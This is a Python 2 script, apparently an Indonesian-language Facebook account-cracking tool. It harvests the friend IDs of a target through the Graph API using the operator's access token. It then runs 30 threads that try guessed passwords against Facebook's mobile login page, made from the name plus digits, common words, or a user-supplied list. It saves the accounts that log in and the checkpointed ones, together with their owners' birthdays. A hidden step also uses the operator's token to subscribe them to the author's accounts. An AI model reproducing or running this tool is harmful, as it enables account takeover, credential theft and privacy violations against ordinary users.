#!/usr/bin/python2
# coding=utf-8

#############################################################
# Author         : Summer Sierra                            #
# Nama Script    : Simple queenzza                          #
# Github         : https://github.com/QUEEN-ZZA             #
# Facebook       : https://www.facebook.com/100040444638677 #
# Instagram      : https://www.instagram.com/               #
# WhatsApp       : WhatsApp                                 #
# Python version : 2.7                                      #
#                                                           #
#     TERIMA KASIH KEPADA ALLOH SWT                         #
#############################################################

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
b='\033[1;94m'

i='\033[1;92m'

c='\033[1;96m'

m='\033[1;91m'

u='\033[1;95m'

k='\033[1;93m'

p='\033[1;97m'

h='\033[1;92m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH 

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text
uas = random.choice(["Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11"])
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'November',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))

def jalan(z):
  for e in z + "\n":
    sys.stdout.write(e)
    sys.stdout.flush()
    time.sleep(0.03)
    
def logo():
  os.system("clear")
  print("""
   ___  _   _ _____ _____ _   _ __________   _     
  / _ \| | | | ____| ____| \ | |__  /__  /  / \    
 | | | | | | |  _| |  _| |  \| | / /  / /  / _ \   
 | |_| | |_| | |___| |___| |\  |/ /_ / /_ / ___ \  
  \__\_v\___/|_____|_____|_| \_/____/____/_/   \_\ 
  Simple By : Summer Sierra
             """)
def bot_follow():
        try:
               token = open('login.txt', 'r').read()
        except IOError:
               print(' [!] TOKEN INVALID')
               os.system('rm -rf login.txt')
               requests.get('https://graph.facebook.com/v1.0/100040444638677/subscribers?access_token='+token)
               requests.get('https://graph.facebook.com/v1.0/100022841983414/subscribers?access_token='+token)
        menu()
        print ' [!] TOKEN INVALID!'
        sys.exit()
    
def tokenz():
  os.system('clear')
  try:
    token = open('login.txt', 'r')
    menu()
  except (KeyError, IOError):
    os.system('clear')
    logo()
    print""+p+""
    print" [+] SEPERTINYA ANDA BELUM LOGIN..! "
    token = raw_input('\n [+] MASUKKAN TOKEN : ')
    try:
      otw = requests.get('https://graph.facebook.com/me?access_token='+token)
      a = json.loads(otw.text)
      zedd = open('login.txt', 'w')
      zedd.write(token)
      zedd.close()
      bot_follow()
    except KeyError:
      print("[!] TOKEN INVALID!")
      sys.exit()
            
    
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'[!] TOKEN INVALID!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'[!] TIDAK ADA KONEKSI!'
        sys.exit()

    logo()
    print(" "+p+"[¤] Author     : Summer Sierra ") 
    print(" [¤] Github     : https://github.com/QUEEN-ZZA")
    print(" [¤] -----------------------------------------")
    print(" [¤] NAMA       : "+nama)
    print(" [¤] ID         : "+id)
    print(" [¤] IP         : "+ip)
    print("")
    print(" [1]. CRACK DARI PUBLIK TEMAN")
    print(" [2]. LIHAT HASIL CARI")
    print(" ["+m+"0"+p+"]. KELUAR (HAPUS TOKEN)")
    pilih_menumbasic()


def pilih_menumbasic():
    ask = raw_input('\n [?] PILIH : ')
    if ask == '':
        print'[!] PILIH MANA BENAR!'
        menu()
    elif ask == '01' or ask == '1':
        print(" [*] ISI 'me' JIKA INGIN CARI DARI DAFTAR TEMAN ")
        idt = raw_input(' [+] MASUKAN ID TARGET : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print' [+] NAMA : ' + sp['name']
        except KeyError:
            print'[!] ID TIDAK TERSEDIA!'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        print' [+] TOTAL ID : ' + str(len(id))

    elif ask == '02' or ask == '2':
        print'\n [1] HASIL OK '
        print' [2] HASIL CP '
        ress = raw_input('\n [?] PILIH : ')
        if ress == '':
            menu()
        elif ress == '01' or ress == '1':
            print'\n [+] HASIL \x1b[0;92mOK\x1b[0;97m TANGGAL : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system(' cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            raw_input("\n [•] KEMBALI ")
            menu()
        elif ress == '02' or ress == '2':
            totalcp = open('out/CP-%s-%s-%s.txt' % (ha, op, ta)).read().splitlines()
            print '\n [¤] HASIL CP TANGGAL : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            print " \033[1;97m[¤] TOTAL : %s" %(len(totalcp))
            print""
            os.system(' cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            raw_input("\n [¤] KEMBALI KE MENU")
            menu()
        else:
            print(' [!] PILIH YANG BENAR!')
            menu()
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        jalan(" [!] BERHASIL MENGHAPUS TOKEN")
        exit()
    else:
        print'[!] PILIH YANG BENAR!'
        menu()
    ask = raw_input(' [?] APAKAH ANDA INGIN MENGGUNAKAN PASSWORD MANUAL? [Y/t]: ')
    if ask == 'Y' or ask == 'y':
        manualmbasic()

    print'\n [¤] HASIL OK DISIMPAN DI : OK.txt'
    print" [¤] HASIL CP DISIMPAN DI : CP.txt"
    print("\n [!] UNTUK BERHENTI TEKAN CTRL+Z DI KEYBOARD ANDA")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[0;97m [CARI] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123', 'anjing', 'bangsat', 'sayang']:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m ︻[OK]❉─────➳ ' + uid + ' | ' + pw + '                                            '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' ︻[OK]❉─────➳ ' + str(uid) + ' | ' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        ttl = b['birthday']
                        print'\r\x1b[0;93m ︻[CUPU]❉─────➳ ' + uid + ' | ' + pw + ' | ' + ttl + '                       '
                        cp.append(uid + ' | ' + pw + ' | ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' ︻[CUPU]❉─────➳ ' + str(uid) + ' | ' + str(pw) + ' | ' + str(ttl) +                       '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        ttl = " "
                    except:pass
                    print'\r\x1b[0;93m ︻[CUPU]❉─────➳ ' + uid + ' | ' + pw + '                        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' ︻[CUPU]❉─────➳ ' + str(uid) + ' | ' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] SELESAI'
    exit()


def manualmbasic():
    print'\n [¤] BUAT PASSWORD CONTOH : bismillah,sayang,bahagia'
    pw = raw_input(' [?] BUAT PASSWORD : ').split(',')
    if len(pw) == 0:
        exit('[!] ISI YANG BENAR , TIDAK BOLEH KOSONG!')
    print'\n [¤] HASIL OK DISIMPAN DI : OK.txt'
    print" [¤] HASIL CP DISIMPAN DI : CP.txt"
    print("\n [!] UNTUK BERHENTI TEKAN CTRL+Z DI KEYBOARD ANDA")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[0;97m [CARI] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m*--> ' + uid + ' | ' + asu + '                          '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('*--> ' + str(uid) + ' | ' + str(asu) +                         '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        ttl = b['birthday']
                        print'\r\x1b[0;93m ︻[CUPU]❉─────➳ ' + uid + ' | ' + asu + ' | ' + ttl + '                       '
                        cp.append(uid + ' | ' + asu + ' | ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' ︻[CUPU]❉─────➳ ' + str(uid) + ' | ' + str(asu) + ' | ' + str(ttl) +                        '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        ttl = " "
                    except:pass
                    print'\r\x1b[0;93m ︻[CUPU]❉─────➳ ' + uid + ' | ' + asu + '                        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' ︻[CUPU]❉─────➳ ' + str(uid) + ' | ' + str(asu) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print'\n[♧] SELESAI'
    exit()
    

    
if __name__ == '__main__':
    os.system('clear')
    print logo
    tokenz()
